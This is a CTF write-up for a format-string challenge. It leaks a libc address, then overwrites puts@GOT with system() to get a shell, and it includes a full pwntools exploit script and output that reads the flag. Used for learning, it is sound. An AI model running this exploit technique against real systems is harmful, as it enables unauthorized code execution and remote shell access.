# Faulty Announcer - CTF Writeup

**Challenge Name:** Faulty Announcer  
**Category:** Binary Exploitation / PWN  
**Difficulty:** Medium  
**Flag:** `V1T{pr1n7f5_d0n7_L13_85d372367fc6a5c183acf686abb857da}`

---

## Table of Contents
1. [Challenge Overview](#challenge-overview)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Vulnerability Analysis](#vulnerability-analysis)
4. [Dynamic Analysis & Information Gathering](#dynamic-analysis--information-gathering)
5. [Exploitation Strategy](#exploitation-strategy)
6. [Writing the Exploit](#writing-the-exploit)
7. [Getting the Flag](#getting-the-flag)
8. [Key Takeaways](#key-takeaways)
9. [References](#references)

---

## Challenge Overview

**Description:** "The speaker has its own ideas."  
**Connection:** `nc chall.v1t.site 30213`

We're given three files:
- `chall` - The main binary
- `libc.so.6` - The C standard library
- `ld-linux-x86-64.so.2` - The dynamic linker

The challenge name "Faulty Announcer" hints that something is wrong with how the program announces or prints messages.

---

## Initial Reconnaissance

### Step 1: Set Up the Environment

First, we use `pwninit` to patch the binary with the correct libc and linker:

```bash
pwninit --bin chall --libc libc.so.6 --ld ld-linux-x86-64.so.2
```

**Why?** This ensures our local testing environment matches the remote server's libc version, making our exploit portable.

**Result:** Creates `chall_patched` - the binary we'll work with.

### Step 2: Check Binary Protections

```bash
checksec --file=chall_patched
```

**Output:**
```
RELRO           STACK CANARY      NX            PIE             
Partial RELRO   Canary found      NX enabled    No PIE
```

**What does this mean?**

- ✅ **No PIE (Position Independent Executable)**: 
  - Addresses are **fixed** and predictable
  - GOT (Global Offset Table) is at a known address: `0x404000`
  - Makes exploitation easier!

- ⚠️ **Partial RELRO (Relocation Read-Only)**:
  - GOT is **writable** (we can modify function pointers)
  - Full RELRO would make GOT read-only

- 🛡️ **Stack Canary**:
  - Protects against simple buffer overflows
  - We need to avoid corrupting the canary

- 🛡️ **NX (No Execute)**:
  - Stack/heap aren't executable
  - Can't inject shellcode
  - Must use ROP (Return Oriented Programming) or similar techniques

### Step 3: Run the Binary

```bash
./chall_patched
```

**Observation:** The program prints a long string of 'Z's from somewhere - this is suspicious and hints at a format string vulnerability.

### Step 4: Analyze the Source Code

Using Ghidra or IDA, we decompile the binary to see the source code:

```c
undefined8 main(EVP_PKEY_CTX *param_1)
{
  char *pcVar1;
  long in_FS_OFFSET;
  char local_a2 [10];      // Name buffer (10 bytes)
  char local_98 [136];     // Input buffer (128 bytes usable)
  long local_10;           // Stack canary
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);  // Load canary
  init(param_1);
  
  puts("What is your name?");
  pcVar1 = fgets(local_a2, 10, stdin);  // Read name (safe)
  
  if (pcVar1 != NULL) {
    puts("Speak loud what do you want");
    pcVar1 = fgets(local_98, 0x80, stdin);  // Read 128 bytes
    
    if (pcVar1 != NULL) {
      printf(local_98);  // ⚠️ VULNERABILITY #1 - Format String Bug!
      
      puts("I SAID SPEAK LOUD!");
      pcVar1 = fgets(local_98, 0x80, stdin);  // Read again
      
      if (pcVar1 != NULL) {
        printf(local_98);  // ⚠️ VULNERABILITY #2 - Format String Bug!
        
        puts("so you said");
        puts(local_a2);  // Print name - THIS IS OUR TRIGGER!
      }
    }
  }
  
  // Check canary before returning
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
  __stack_chk_fail();
}
```

---

## Understanding Key Concepts (For Beginners)

Before diving into the vulnerability, let's understand some fundamental concepts:

### What is GOT? (Global Offset Table)

**Simple Explanation:**

Think of GOT as a **phone book** for your program. When your program wants to call a function like `puts()`, it doesn't know the exact memory address. So it looks it up in the GOT.

**Real-World Analogy:**
```
You want to call Pizza Hut
    ↓
Look up "Pizza Hut" in phone book (GOT)
    ↓
Find number: 555-1234
    ↓
Dial that number
```

**In Programs:**
```
Program wants to call puts()
    ↓
Look up "puts" in GOT (at address 0x404000)
    ↓
Find address: 0x7ffff7c80000
    ↓
Jump to that address (execute real puts)
```

### Memory Layout with GOT

```
Program Memory:
┌──────────────────────────────────────┐
│ Code (.text section)                 │
│   0x400000: main() function          │
│   0x401000: other functions          │
├──────────────────────────────────────┤
│ GOT (.got section)                   │
│   0x404000: puts address   ← WE TARGET THIS!
│   0x404008: printf address           │
│   0x404010: fgets address            │
├──────────────────────────────────────┤
│ Stack                                │
│ Heap                                 │
└──────────────────────────────────────┘
```

### How We Found puts@GOT Address (0x404000)

**Method 1: Using readelf**
```bash
readelf -r chall_patched | grep puts
```
Output:
```
000000404000  000100000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
^^^^^^^^^^ This is the address!
```

**Method 2: Using pwntools (what we used)**
```python
elf = ELF('./chall_patched')
puts_got = elf.got['puts']  # Automatically finds it: 0x404000
```

**Why is this address fixed?**
- Because **No PIE** (Position Independent Executable) is disabled
- All addresses in the binary are hardcoded and never change
- This makes exploitation easier!

### What is `elf.got['puts']`?

Let's break this down:

```python
from pwn import *

# Step 1: Load the binary
elf = ELF('./chall_patched')
# This reads the binary file and parses its structure

# Step 2: Access the GOT
elf.got  # This is a dictionary: {'puts': 0x404000, 'printf': 0x404010, ...}

# Step 3: Get puts entry
puts_got = elf.got['puts']  # Returns: 0x404000
```

**Analogy:**
```python
# It's like accessing a dictionary:
phone_book = {
    'puts': 0x404000,
    'printf': 0x404010,
    'system': 0x404018
}

puts_address = phone_book['puts']  # Gets 0x404000
```

### How We Found Libc Base (0x7ffff7c00000)

**In GDB, we used the `vmmap` command:**

```bash
pwndbg> vmmap
```

**Output:**
```
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File
    0x7ffff7c00000     0x7ffff7c28000 r--p    28000       0 libc.so.6
    ^^^^^^^^^^                                             ^^^^^^^^^
    This is the                                            This tells us
    libc BASE address!                                     it's the libc file
```

**What does this mean?**

- Libraries (like libc) are loaded into memory at runtime
- `vmmap` shows us **where** they are loaded
- The **first address** where libc appears is the base address
- All functions in libc are at: `libc_base + offset`

**Example:**
```
libc_base = 0x7ffff7c00000
system is at offset 0x58750 from base
Therefore: system = 0x7ffff7c00000 + 0x58750 = 0x7ffff7c58750
```

### Why Overwrite GOT?

**The Attack Concept:**

If we can **change** the address stored in the GOT, we can redirect function calls!

**Before Attack:**
```
Program code:        puts("sh");
                       ↓
Looks up GOT:        [0x404000] = 0x7ffff7c80000
                       ↓
Calls:               Real puts() function
Result:              Prints "sh" to screen
```

**After GOT Overwrite:**
```
Program code:        puts("sh");  ← Same code
                       ↓
Looks up GOT:        [0x404000] = 0x7ffff7c58750  ← WE CHANGED THIS!
                       ↓
Calls:               system() function  ← Different function!
Result:              system("sh") → Spawns a shell! 🎉
```

**The Magic:**
- Program thinks it's calling `puts()`
- But we've secretly changed the GOT entry
- So it actually calls `system()`
- Since we control the argument ("sh"), we get a shell!

### Visual Attack Flow

```
┌────────────────────────────────────────────────────────┐
│ STEP 1: Set name = "sh"                                │
│ ┌────────────────┐                                     │
│ │ Name: "sh"     │  ← Stored in memory                 │
│ └────────────────┘                                     │
└────────────────────────────────────────────────────────┘
                         ↓
┌────────────────────────────────────────────────────────┐
│ STEP 2: Leak libc address                              │
│ Format String: %1$p                                    │
│ Gets: 0x7ffff7e03963                                   │
│ Calculate: libc_base = 0x7ffff7c00000                  │
│ Calculate: system = 0x7ffff7c58750                     │
└────────────────────────────────────────────────────────┘
                         ↓
┌────────────────────────────────────────────────────────┐
│ STEP 3: Overwrite GOT                                  │
│                                                         │
│ BEFORE:                      AFTER:                    │
│ ┌──────────────────┐        ┌──────────────────┐      │
│ │ GOT (0x404000)   │        │ GOT (0x404000)   │      │
│ │ ↓                │   →    │ ↓                │      │
│ │ puts() addr      │        │ system() addr    │      │
│ └──────────────────┘        └──────────────────┘      │
└────────────────────────────────────────────────────────┘
                         ↓
┌────────────────────────────────────────────────────────┐
│ STEP 4: Program executes                               │
│                                                         │
│ puts("sh")     ← Program thinks it's calling puts      │
│    ↓                                                    │
│ GOT lookup     ← Finds system() instead!               │
│    ↓                                                    │
│ system("sh")   ← Actually executes system              │
│    ↓                                                    │
│ Shell! 🎉      ← We get a shell!                       │
└────────────────────────────────────────────────────────┘
```

---

## Vulnerability Analysis

### The Format String Vulnerability

**What's the bug?**

The program calls `printf(local_98)` instead of `printf("%s", local_98)`.

**Why is this dangerous?**

When you call `printf` with user-controlled input as the format string:
- `printf("%p")` leaks values from the stack
- `printf("%n")` writes to memory
- Attackers control what gets read/written

**Example:**
```c
// Safe:
printf("%s", user_input);  // Treats input as data

// Vulnerable:
printf(user_input);  // Treats input as format string
```

### Two Opportunities

We have **TWO** format string bugs, which gives us:
1. **First printf**: Leak information (addresses, canary, etc.)
2. **Second printf**: Write to memory (overwrite function pointers)

### The Attack Vector

Looking at the end of `main()`:
```c
puts("so you said");
puts(local_a2);  // Calls puts() with our name
```

**Key insight:** If we:
1. Set `name = "sh"`
2. Overwrite `puts@GOT` with `system`
3. The program calls `puts("sh")` which becomes `system("sh")` → **SHELL!**

---

## Dynamic Analysis & Information Gathering

### Test 1: Confirm Format String Works

```bash
echo -e "test\n%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\nAAA" | ./chall_patched
```

**Output:**
```
0x7fd4b5003963.0xfbad208b.0x7ffdac250240.0x1.(nil).0x6574000000000800...
```

✅ **Confirmed!** The program leaks stack values.

**What we're seeing:**
- `0x7f...` addresses = libc or stack pointers
- `0x6574000000000800` = Stack canary (notice the `00` byte at the end)

### Test 2: Find What Position 1 Leaks

We need to identify what the first leaked address points to.

**Using GDB (pwndbg):**

```bash
pwndbg chall_patched
break *0x4012bf    # Break at first printf
run
```

**Input:**
- Name: `test`
- First input: `%1$p`

**Why break at `0x4012bf`?** That's the address of the `call printf` instruction.

**GDB Output:**
```
RSI  0x7ffff7e03963 (_IO_2_1_stdin_+131)
```

**Then continue:**
```
c
0x7ffff7e03963
```

**Discovery:** Position 1 leaks `_IO_2_1_stdin_+131`!

**Check libc base with vmmap:**
```
pwndbg> vmmap
```

**Output:**
```
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File
    0x7ffff7c00000     0x7ffff7c28000 r--p    28000       0 libc.so.6  ← Libc starts here!
    0x7ffff7c28000     0x7ffff7db0000 r-xp   188000   28000 libc.so.6
    0x7ffff7db0000     0x7ffff7dff000 r--p    4f000  1b0000 libc.so.6
```

**How to read this:**
- `Start` column shows where each memory region begins
- The **first line** where `libc.so.6` appears shows the base address
- In this case: **0x7ffff7c00000** is the libc base

**Why do we need this?**
- All functions in libc are at: `libc_base + offset`
- `system()` is at: `0x7ffff7c00000 + 0x58750 = 0x7ffff7c58750`
- `puts()` is at: `0x7ffff7c00000 + 0x80000 = 0x7ffff7c80000`

**Calculate offset:**
```
Leaked address:  0x7ffff7e03963  (_IO_2_1_stdin_+131)
Libc base:       0x7ffff7c00000  (from vmmap)
Offset:          0x7ffff7e03963 - 0x7ffff7c00000 = 0x203963
```

**What this means:**
- `_IO_2_1_stdin_` is always at offset `0x203963` in this libc
- When we leak an address remotely, we can calculate: `libc_base = leaked - 0x203963`
- Then we can find any function: `system = libc_base + 0x58750`

### Test 3: Find Our Buffer Position

We need to know where our input appears on the stack to write addresses.

**Run in GDB:**
```bash
break *0x4012bf
run
```

**Input:**
- Name: `test`
- First input: `AAAABBBB%6$p%7$p%8$p%9$p%10$p%11$p%12$p`

**Continue:**
```
c
```

**Output:**
```
AAAABBBB0x65740000000008000xa74730x42424242414141410x7024372570243625...
```

**Analysis:**
- `0x4242424241414141` = Our `BBBBAAAA` marker (little-endian)
- It appears at position 8!

**Why little-endian?** x86-64 stores bytes in reverse order:
- We sent: `AAAABBBB`
- Memory stores: `\x41\x41\x41\x41\x42\x42\x42\x42`
- Read as 64-bit: `0x4242424241414141`

### Test 4: Find system() Address

We need `system()` address to overwrite the GOT.

**In GDB:**
```
p system
$1 = {int (const char *)} 0x7ffff7c58750 <__libc_system>
```

**Calculate offset:**
```
system address:  0x7ffff7c58750
Libc base:       0x7ffff7c00000
Offset:          0x58750
```

### Summary of Gathered Information

| Item | Value | How we found it | Why we need it |
|------|-------|-----------------|----------------|
| Libc leak position | Position 1 (`%1$p`) | Tested format strings, saw `0x7f...` address | To leak libc address remotely |
| Libc leak offset | `0x203963` | GDB: `leaked_addr - libc_base` | To calculate libc_base from leak |
| Buffer position | Position 8 | Found `AAAABBBB` marker at `%8$p` | To write addresses with format string |
| system() offset | `0x58750` | GDB: `p system`, then `addr - libc_base` | To calculate system address |
| puts@GOT address | `0x404000` | `readelf -r` or `elf.got['puts']` | Target address to overwrite |

**Understanding the offsets:**

```
┌─────────────────────────────────────────────────────┐
│              LIBC MEMORY LAYOUT                     │
├─────────────────────────────────────────────────────┤
│ Base: 0x7ffff7c00000                                │
│   ├─ +0x00000: Start of libc                        │
│   ├─ +0x58750: system() function   ← We need this!  │
│   ├─ +0x80000: puts() function                      │
│   └─ +0x203963: _IO_2_1_stdin_+131 ← We leak this!  │
└─────────────────────────────────────────────────────┘

When we leak 0x7ffff7e03963:
  libc_base = 0x7ffff7e03963 - 0x203963 = 0x7ffff7c00000
  
Then we can find system:
  system = 0x7ffff7c00000 + 0x58750 = 0x7ffff7c58750
```

---

## Exploitation Strategy

### Attack Plan

```
┌─────────────────────────────────────────────────────────────┐
│ Step 1: Set name = "sh"                                     │
│   → This will be used at the end: puts("sh")                │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Step 2: Leak libc (First format string)                     │
│   → Send: %1$p                                               │
│   → Get: 0x7f...03963 (_IO_2_1_stdin_+131)                  │
│   → Calculate: libc_base = leaked - 0x203963                │
│   → Calculate: system_addr = libc_base + 0x58750            │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Step 3: Overwrite GOT (Second format string)                │
│   → Target: puts@GOT (0x404000)                             │
│   → Value: system address                                    │
│   → Method: Format string write using %n                     │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ Step 4: Trigger shell                                        │
│   → Program executes: puts("sh")                            │
│   → Actually executes: system("sh")  ← GOT overwritten!     │
│   → Result: SHELL! 🎉                                       │
└─────────────────────────────────────────────────────────────┘
```

### Why This Works

**The GOT (Global Offset Table):**
- Stores addresses of library functions
- When program calls `puts()`, it looks up the address in GOT
- If we overwrite `puts@GOT` with `system`, calling `puts()` actually calls `system()`

**Why "sh"?**
- `system("sh")` spawns a shell
- `system("/bin/sh")` would also work but "sh" is shorter

---

## Writing the Exploit

### Understanding Format String Writes

**Format string basics:**
- `%p` - Print pointer (read)
- `%n` - Write number of bytes printed so far
- `%N$p` - Read Nth argument
- `%N$n` - Write to Nth argument

**Example of %n:**
```python
# If we print 100 characters then use %n:
"A" * 100 + "%10$n"
# This writes the value 100 to the address at position 10
```

**The challenge:** We need to write an 8-byte address (64-bit), but format strings write 4 bytes at a time.

**Solution:** Use `fmtstr_payload()` from pwntools - it handles the complexity!

### The Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

# Set up context
context.arch = 'amd64'
context.log_level = 'info'

# Connect to remote server
io = remote('chall.v1t.site', 30213)

# Offsets we discovered
LIBC_LEAK_OFFSET = 1          # Position 1 leaks _IO_2_1_stdin_+131
STDIN_OFFSET = 0x203963       # Offset of _IO_2_1_stdin_ in libc
BUFFER_OFFSET = 8             # Our buffer starts at position 8
SYSTEM_OFFSET = 0x58750       # Offset of system() in libc

# Load binary to get GOT addresses
elf = ELF('./chall_patched')

# ═══════════════════════════════════════════════════════════
# Step 1: Set name to "sh"
# ═══════════════════════════════════════════════════════════
io.sendlineafter(b'name?\n', b'sh')
log.info("Set name to 'sh'")

# ═══════════════════════════════════════════════════════════
# Step 2: Leak libc address using first format string
# ═══════════════════════════════════════════════════════════
io.sendlineafter(b'want\n', b'%1$p')
leak = int(io.recvline().strip(), 16)

# Calculate libc base
libc_base = leak - STDIN_OFFSET
system_addr = libc_base + SYSTEM_OFFSET

log.success(f"Leaked address: {hex(leak)}")
log.success(f"Libc base: {hex(libc_base)}")
log.success(f"system() at: {hex(system_addr)}")

# ═══════════════════════════════════════════════════════════
# Step 3: Overwrite puts@GOT with system using second format string
# ═══════════════════════════════════════════════════════════
puts_got = elf.got['puts']
log.info(f"Target: puts@GOT at {hex(puts_got)}")

# Create payload to write system_addr to puts_got
# fmtstr_payload automatically handles:
# - Splitting the address into chunks
# - Calculating padding needed
# - Positioning writes at correct offsets
payload = fmtstr_payload(BUFFER_OFFSET, {puts_got: system_addr})

io.sendlineafter(b'LOUD!\n', payload)
log.success("GOT overwrite payload sent!")

# ═══════════════════════════════════════════════════════════
# Step 4: Trigger shell (puts("sh") becomes system("sh"))
# ═══════════════════════════════════════════════════════════
log.success("Shell should spawn now!")
io.interactive()
```

### Breaking Down the Exploit

**1. Setting the name:**
```python
io.sendlineafter(b'name?\n', b'sh')
```
- Waits for the prompt "What is your name?"
- Sends "sh\n" (sh + newline)
- This name will be used in `puts("sh")` at the end
- Why "sh"? Because `system("sh")` spawns a shell!

**2. Leaking libc:**
```python
io.sendlineafter(b'want\n', b'%1$p')
leak = int(io.recvline().strip(), 16)
```
**Step-by-step:**
1. Wait for "Speak loud what do you want"
2. Send `%1$p` (format string to print position 1)
3. Receive output like `0x7f1234e03963`
4. `strip()` removes the newline: `0x7f1234e03963`
5. `int(..., 16)` converts hex string to integer: `140119668581731`

**Why position 1?** We discovered in GDB that position 1 contains `_IO_2_1_stdin_+131`

**3. Calculating addresses:**
```python
libc_base = leak - STDIN_OFFSET
system_addr = libc_base + SYSTEM_OFFSET
```

**Visual explanation:**
```
Step 1: Get libc base
┌────────────────────────────────────┐
│ Leaked: 0x7f1234e03963             │
│ Minus:  0x203963 (known offset)    │
│ ─────────────────────────────      │
│ Equals: 0x7f1234c00000 (base)     │
└────────────────────────────────────┘

Step 2: Find system
┌────────────────────────────────────┐
│ Base:   0x7f1234c00000             │
│ Plus:   0x58750 (system offset)    │
│ ─────────────────────────────────  │
│ Equals: 0x7f1234c58750 (system)   │
└────────────────────────────────────┘
```

**4. Creating the write payload:**
```python
payload = fmtstr_payload(BUFFER_OFFSET, {puts_got: system_addr})
```

**What does this do?**

`fmtstr_payload()` is a pwntools function that generates a complex format string to write values to memory.

**Parameters:**
- `BUFFER_OFFSET = 8`: Our input buffer appears at position 8 on the stack
- `{puts_got: system_addr}`: Dictionary = {where_to_write: what_to_write}
  - `puts_got = 0x404000` (address of puts in GOT)
  - `system_addr = 0x7f1234c58750` (calculated system address)

**What payload looks like (simplified):**

```
[addr1][addr2][addr3]%1234c%8$hn%5678c%9$hn%9012c%10$hn
^^^^^^^^^^^^^^^^^^^^^                                      
These are the target    These format strings cause writes
addresses we want       to those addresses
to write to
```

**How it works:**

1. The addresses `[addr1][addr2][addr3]` are placed at positions 8, 9, 10 on the stack
2. `%1234c` prints 1234 characters (controls the value to write)
3. `%8$hn` writes 2 bytes to position 8 (which points to our target address)
4. This repeats to write all 8 bytes (64-bit address) in chunks

**Why chunks?** Because we need to write 8 bytes, but format strings write in smaller pieces (2 or 4 bytes at a time).

**Example of what gets written:**

```
Memory Before:
0x404000: 0x7ffff7c80000  ← Old puts address

Memory After:
0x404000: 0x7f1234c58750  ← New system address

How:
  0x404000: Write 0x8750 (2 bytes)
  0x404002: Write 0xc5   (2 bytes)
  0x404004: Write 0x34   (2 bytes)  
  0x404006: Write 0x7f12 (2 bytes)
Result: Complete 8-byte address written!
```

**5. Getting interactive shell:**
```python
io.interactive()
```
- Gives us control of stdin/stdout
- We can now type commands like `ls`, `cat flag.txt`
- The shell is spawned when program calls `puts("sh")` which is now `system("sh")`

### Why `elf.got['puts']` Works

**Behind the scenes:**

```python
from pwn import *

elf = ELF('./chall_patched')
# This does:
# 1. Opens the binary file
# 2. Parses ELF format
# 3. Finds all sections (.text, .data, .got, etc.)
# 4. Builds a dictionary of GOT entries

# Now you can access:
elf.got['puts']     # → 0x404000
elf.got['printf']   # → 0x404010  
elf.got['fgets']    # → 0x404018

# It's like a dictionary lookup:
got_table = {
    'puts': 0x404000,
    'printf': 0x404010,
    'fgets': 0x404018
}
address = got_table['puts']  # Same thing!
```

**Manual way (if pwntools didn't exist):**

```bash
# Find it manually
readelf -r chall_patched | grep puts
000000404000  000100000007 R_X86_64_JUMP_SLO puts

# Then hardcode in Python
puts_got = 0x404000
```

But using `elf.got['puts']` is better because it's automatic and less error-prone!

---

## Getting the Flag

### Running the Exploit

```bash
python3 exploit.py
```

**Output:**
```
[+] Opening connection to chall.v1t.site on port 30213: Done
[+] Leaked address: 0x7f804f4aa963
[+] Libc base: 0x7f804f2a7000
[+] system() at: 0x7f804f2ff750
[*] Target: puts@GOT at 0x404000
[+] GOT overwrite payload sent!
[+] Shell should spawn now!
[*] Switching to interactive mode
$ ls
chall
flag.txt
ld-linux-x86-64.so.2
libc.so.6
$ cat flag.txt
V1T{pr1n7f5_d0n7_L13_85d372367fc6a5c183acf686abb857da}
$
```

🎉 **Flag captured!**

---

## Key Takeaways

### Format String Vulnerabilities

**Always use format strings correctly:**
```c
// ❌ Vulnerable
printf(user_input);

// ✅ Safe
printf("%s", user_input);
```

### Attack Techniques Learned

1. **Information Disclosure:**
   - Format strings can leak stack values
   - Used `%p` to read addresses
   - Position parameters (`%N$p`) for specific offsets

2. **Memory Corruption:**
   - Format strings can write to memory using `%n`
   - Can overwrite function pointers (GOT entries)
   - Combined with leaked addresses for full exploitation

3. **GOT Overwrite:**
   - With no PIE, GOT addresses are predictable
   - Partial RELRO means GOT is writable
   - Redirecting library calls to attacker-controlled functions

### Binary Protection Bypass

| Protection | How we handled it |
|------------|-------------------|
| Stack Canary | Didn't need to bypass - no buffer overflow |
| NX | Used GOT overwrite instead of shellcode |
| No PIE | Made exploitation easier (fixed addresses) |
| Partial RELRO | Allowed GOT overwrites |

### Tools Used

1. **pwninit** - Patch binary with correct libc/ld
2. **checksec** - Identify binary protections
3. **GDB (pwndbg)** - Dynamic analysis, find offsets
4. **pwntools** - Exploit framework
   - `fmtstr_payload()` - Generate format string writes
   - `remote()` - Connect to server
   - `ELF()` - Parse binary for addresses

---

## Debugging Tips for Future Challenges

### Finding Offsets

**1. Stack Layout:**
```bash
# In GDB at printf breakpoint:
telescope $rsp 30    # View stack with pwndbg
x/30gx $rsp          # Raw view
```

**2. Libc Addresses:**
```bash
vmmap                # Show memory mappings
info proc mappings   # Alternative
```

**3. Function Offsets:**
```bash
p system            # In GDB
p printf
p malloc
```

### Testing Format Strings

**Quick tests:**
```bash
# Leak multiple values
echo -e "test\n%p.%p.%p.%p.%p.%p\nAAA" | ./binary

# Find buffer position
echo -e "test\nAAAABBBB%6\$p%7\$p%8\$p\nAAA" | ./binary
```

### Common Issues

**Problem:** "Process died immediately"
- **Cause:** Wrong offset, corrupted canary, or bad write
- **Debug:** Use GDB to step through and check registers/stack

**Problem:** "Payload too large"
- **Cause:** Format string payload > 128 bytes (buffer size)
- **Solution:** Use `write_size='byte'` in fmtstr_payload

**Problem:** "Works locally but not remotely"
- **Cause:** Different libc version
- **Solution:** Leak multiple functions, use libc database to identify version

---

## References

### Learning Resources

**Format String Attacks:**
- [Nightmare Format Strings](https://guyinatuxedo.github.io/07-format_strings/index.html)
- [ir0nstone Format String Guide](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
- [OWASP Format String](https://owasp.org/www-community/attacks/Format_string_attack)

**GOT/PLT:**
- [GOT and PLT Explained](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)
- [ir0nstone GOT Overwrite](https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite)

**Pwntools:**
- [Official Documentation](https://docs.pwntools.com/)
- [fmtstr_payload](https://docs.pwntools.com/en/stable/fmtstr.html)

### Tools

- **pwntools:** `pip install pwntools`
- **pwndbg:** [GitHub](https://github.com/pwndbg/pwndbg)
- **pwninit:** [GitHub](https://github.com/io12/pwninit)
- **checksec:** Part of pwntools or standalone

---

## Complete Exploit Code

```python
#!/usr/bin/env python3
"""
Faulty Announcer - Format String Exploitation
Author: [Your Name]
Challenge: V1T CTF 2025
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Connection
REMOTE = True
if REMOTE:
    io = remote('chall.v1t.site', 30213)
else:
    io = process('./chall_patched')

# Offsets discovered during analysis
LIBC_LEAK_OFFSET = 1          # Position 1 leaks _IO_2_1_stdin_+131
STDIN_OFFSET = 0x203963       # _IO_2_1_stdin_ offset in libc
BUFFER_OFFSET = 8             # Our buffer starts at position 8
SYSTEM_OFFSET = 0x58750       # system() offset in libc

# Load binary for GOT addresses
elf = ELF('./chall_patched')

# Step 1: Set name to "sh"
io.sendlineafter(b'name?\n', b'sh')

# Step 2: Leak libc base
io.sendlineafter(b'want\n', b'%1$p')
leak = int(io.recvline().strip(), 16)
libc_base = leak - STDIN_OFFSET
system_addr = libc_base + SYSTEM_OFFSET

log.success(f"Libc base: {hex(libc_base)}")
log.success(f"system(): {hex(system_addr)}")

# Step 3: Overwrite puts@GOT with system
puts_got = elf.got['puts']
payload = fmtstr_payload(BUFFER_OFFSET, {puts_got: system_addr})
io.sendlineafter(b'LOUD!\n', payload)

# Step 4: Get shell
log.success("Popping shell!")
io.interactive()
```

---

## Final Notes

This challenge demonstrates:
- ✅ Information disclosure through format strings
- ✅ Memory corruption via format string writes
- ✅ GOT overwrite technique
- ✅ Chaining multiple vulnerabilities
- ✅ Adapting exploits for remote servers

**Key lesson:** Format string bugs are powerful - they can read AND write memory, making them excellent primitives for exploitation!

---

**Flag:** `V1T{pr1n7f5_d0n7_L13_85d372367fc6a5c183acf686abb857da}`

*Happy Hacking! 🚩*
